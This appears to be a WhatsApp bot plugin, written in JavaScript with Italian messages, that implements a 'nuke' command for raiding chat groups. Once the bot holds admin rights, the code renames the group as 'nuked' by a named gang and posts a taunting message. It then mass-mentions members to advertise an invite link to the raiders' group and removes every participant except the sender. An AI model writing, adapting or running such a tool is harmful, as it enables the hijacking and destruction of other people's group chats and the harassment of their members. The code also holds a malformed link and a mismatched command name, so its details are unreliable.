let handler = async (m, { conn, isROwner }) => {
  if (!m.isGroup) return await conn.reply(m.chat, 'Questo comando funziona solo nei gruppi.', m)

  const userId = m.sender
  const groupId = m.chat
  const botJid = conn.user?.jid || conn.user?.id || ''

  try {
    const metadata = await conn.groupMetadata(m.chat).catch(() => null)
    if (!metadata) return await conn.reply(m.chat, 'Impossibile recuperare i dati del gruppo.', m)

    const oldTitle = metadata.subject || 'FALLITI'
    const newTitle = `${oldTitle} | 𝙽𝚄𝙺𝙴𝙳 𝙱𝚈 ⸸ᴰᴱᴬᵀᴴ ᴸᴬᴺᴰ⸸ ᵍʳᵒᵘᵖ`
    await conn.groupUpdateSubject(m.chat, newTitle)

    await conn.sendMessage(m.chat, { text: '« 𝘉𝘌𝘕𝘝𝘌𝘕𝘜𝘛𝘖 𝘕𝘌𝘓 𝘛𝘜𝘖 𝘓𝘐𝘔𝘉𝘖. 𝘘𝘜𝘌𝘚𝘛𝘖 𝘕𝘖𝘕 𝘌̀ 𝘚𝘖𝘓𝘖 𝘜𝘕 𝘚𝘝𝘛, 𝘔𝘈 𝘜𝘕 𝘚𝘌𝘎𝘕𝘖 𝘋𝘌𝘓 𝘋𝘌𝘚𝘛𝘐𝘕𝘖. 𝘌𝘕𝘛𝘙𝘈 𝘕𝘌𝘓 𝘕𝘖𝘚𝘛𝘙𝘖 𝘎𝘙𝘜𝘗𝘗𝘖 𝘌 𝘙𝘐𝘊𝘖𝘙𝘋𝘈 𝘊𝘏𝘌 𝘚𝘌𝘐 𝘚𝘖𝘓𝘖 𝘜𝘕 𝘈𝘉𝘜𝘚𝘈𝘛𝘖. ’. »' }, { quoted: m })

    const mentions = metadata.participants
      .filter(participant => participant.id !== botJid)
      .map(participant => participant.id)

    await conn.sendMessage(
      m.chat,
      {
        text: '« 𝘌𝘕𝘛𝘙𝘈𝘛𝘌 𝘛𝘜𝘛𝘛𝘐 𝘘𝘜𝘐 𝘈𝘋𝘌𝘚𝘚𝘖 \nhttps://https://chat.whatsapp.com/IUGTk5puCDq2qwphtSzm6z »',
        mentions
      },
      { quoted: m }
    )

    const participantsToRemove = metadata.participants
      .filter(participant => participant.id !== m.sender)
      .map(participant => participant.id)

    if (participantsToRemove.length > 0) {
      try {
        await conn.groupParticipantsUpdate(m.chat, participantsToRemove, 'remove')
      } catch (error) {
        console.error('Errore kick partecipanti:', error)
      }
    }

    await conn.sendMessage(m.chat, { text: 'Operazione completata: nome modificato e partecipanti rimossi.' }, { quoted: m })
  } catch (error) {
    console.error(error)
    await conn.reply(m.chat, 'Errore durante l’esecuzione di .afterlight.', m)
  }
} 
handler.help = ['nuke']
handler.tags = ['owner']
handler.command = /^(astenua)$/i
handler.group = true
handler.botAdmin = true
handler.rowner = true

export default handler
